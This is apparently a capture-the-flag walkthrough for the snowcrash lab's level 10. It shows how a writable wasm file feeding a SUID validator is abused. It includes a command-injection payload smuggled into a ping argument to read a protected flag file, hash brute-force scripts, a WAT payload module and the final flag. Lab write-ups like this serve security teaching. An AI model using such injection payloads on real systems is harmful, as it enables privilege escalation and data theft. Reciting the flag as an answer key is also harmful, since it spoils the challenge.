# Level 10

This time, we have quite a few files in `/opt/snowcrash/level10` :
```bash
$ ls -la /opt/snowcrash/level10
total 40
drwxr-xr-x  2 root   root     4096 Jun  9 19:04 .
drwxr-xr-x 18 root   root     4096 Jun  9 19:04 ..
-rw-rw----  1 flag10 level10   179 Sep 28 08:48 enzo.wasm
-r-sr-x---  1 flag10 level10 16528 Jun  9 19:04 enzo_runner
-rwxr-x---  1 flag10 level10    95 Jun  9 19:04 pipeline.sh
-rw-r-----  1 flag10 level10  3067 Jun  9 19:04 validate.js
```

The entrypoint seems to be in the ELF `enzo_runner` with SUID permissions as `flag10`. If we look at its strings :

```bash
$ strings /opt/snowcrash/level10/enzo_runner 
...
enzo_runner: pipe
enzo_runner: fork
/usr/local/bin/wasmtime
enzo_runner: execl wasmtime
/usr/bin/qjs
enzo_runner: execl qjs
/opt/snowcrash/level10/enzo.wasm
/opt/snowcrash/level10/validate.js
...
dup2@GLIBC_2.2.5
geteuid@GLIBC_2.2.5
close@GLIBC_2.2.5
pipe@GLIBC_2.2.5
...
```

And if we look at the `pipeline.sh` file :

```bash
$ cat /opt/snowcrash/level10/pipeline.sh 
#!/bin/bash
wasmtime /opt/snowcrash/level10/enzo.wasm | qjs /opt/snowcrash/level10/validate.js
```

We can safely assume that all it does is pipe the output of the wasm file to the JS script. Because we have write access to `enzo.wasm`, there is a possible injection entrypoint here. Let's have a look at the `validate.js`. It seems to be a simple validation chain with a hashing mechanism :

```js
const validate = _p(
    _normalize,
    t => _split(t),
    r => r.chain(_validateL),
    r => r.chain(_validateV),
    r => r.chain(_checkReserved),
    r => r.chain(_verify),
    r => r.chain(xs => {
        const _key = _hash(xs[0].slice(1) + xs[2].slice(0,2)).toString(36)
        const action = _dispatch[_key]
        return action ? Ok(action(xs[1])) : Err('no handler')
    })
)
```

All these validators can be simplified as such :
- `_normalize` only removes unnecesary white spaces.
- `_split` checks for ':' and splits the chains.
- `_validateL` checks that there are now 3 fields, meaning the output needs 2 ':'.
- `_validateV` checks that the first field is `v1`.
- `_checkReserved` checks that the second field is not one of 3 reserved words.
- `_verify` checks that the third field is the 16-bit hash of the second, according to the `_hash` function.
- The last node takes '1' + the first two characters of the third field, computes his hash to base 36, and executes an action if it corresponds to one of three dispatchers.

We now have a pretty good base for our injection. We need to see if we can do anything useful with the dispatchers :

```js
const _k0 = _hash('1fc').toString(36)
const _k1 = _hash('1d0').toString(36)
const _k2 = _hash('1a4').toString(36)

const _dispatch = _F({
    [_k0]: _b(x => std.popen(x, 'r'))(_c(x => y => x + y)('logger\x20-t\x20appd\x20')),
    [_k1]: _b(x => std.popen(x, 'r'))(_c(x => y => x + y)('systemctl\x20reload\x20')),
    [_k2]: _b(x => std.popen(x, 'r'))(_c(x => y => x + y)('ping\x20-c1\x20')),
})
```

`popen` allows to execute a shell command, so executed by the `flag10` user, we can read the file ! The most interesting of the three is the third one. By the definition of `_b` and `_c`, the line is similar to executing this in the shell :

```bash
ping -c1 <v2>
```

with v2 being the second field. We could therefore do something like :

```bash
ping -c1 127.0.0.1;cat /home/flag10/.flag >&2;#filler for the hash
```

We now need to find a way to execute the third dispatch. So '1' + first two chars of `hash` = `_k2`. By copying the JS script and adding a simple `console.log`, we see that `_k2 = teo3gp`. We create a simple Python script that re-creates the hash function, and we brute-force it as it is just 2 chars :

```python
# -- hash_start.py --

# Hash function of JS script
def h(s):
    x = 0x811c9dc5
    for c in s:
        x = ((x ^ ord(c)) * 0x01000193) & 0xffffffff
    return x

# Converting to base 36
def b36(n):
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    out = ""
    while n:
        n, r = divmod(n, 36)
        out = chars[r] + out
    return out or "0"

for i in range(256):
    xx = f"{i:02x}"
    if b36(h("1" + xx)) == "teo3gp":
        print("XX =", xx)
```

that gives us : `XX = a4`. Good ! We now need a random comment, which added to `127.0.0.1;cat /home/flag10/.flag >&2;#` would give us a hash that starts with `a4`. Once again, because the hashes are quite short, we can brute force it with no problem :

```python
# -- hash_finder.py --
import string
import itertools

def h(s):
    x = 0x811c9dc5
    for c in s:
        x = ((x ^ ord(c)) * 0x01000193) & 0xffffffff
    return x

base = "127.0.0.1;cat /home/flag10/.flag >&2;#"

for n in range(5):
    for tup in itertools.product(string.ascii_letters + string.digits, repeat=n):
        suffix = ''.join(tup)
        value = h(base + suffix)
        hexhash = f"{value:08x}"

        if hexhash.startswith("a4"):
            print("suffix =", repr(suffix))
            print("hash   =", hexhash)
            exit(0)
```

and this gives us :
```bash
suffix = '5'
hash   = a4fb15a3
```

So a valid string that enables the injection is `v1:127.0.0.1;cat /home/flag10/.flag >&2;#5:a4fb15a3`. We now just need to recreate the `wasm` file to output this new string :

```wasm
(module
  (import "wasi_snapshot_preview1" "fd_write"
    (func $write (param i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1)

  (data (i32.const 8)
    "v1:127.0.0.1;cat /home/flag10/.flag >&2;#5:a4fb15a3")

  (func (export "_start")
    ;; iovec[0].buf = 8
    i32.const 0
    i32.const 8
    i32.store

    ;; iovec[0].buf_len = 51
    i32.const 4
    i32.const 51
    i32.store

    ;; fd_write(1, 0, 1, 16)
    i32.const 1
    i32.const 0
    i32.const 1
    i32.const 16
    call $write
    drop
  )
)
```

We now compile it and overwrite the previous one :
```bash
$ wat2wasm enzo.wat
$ cat enzo.wasm | tee /opt/snowcrash/level10/enzo.wasm
```

And we can just execute `/opt/snowcrash/level10/enzo_runner` and we get the hash : `g457ws0du8osi4t4tlea00cxe`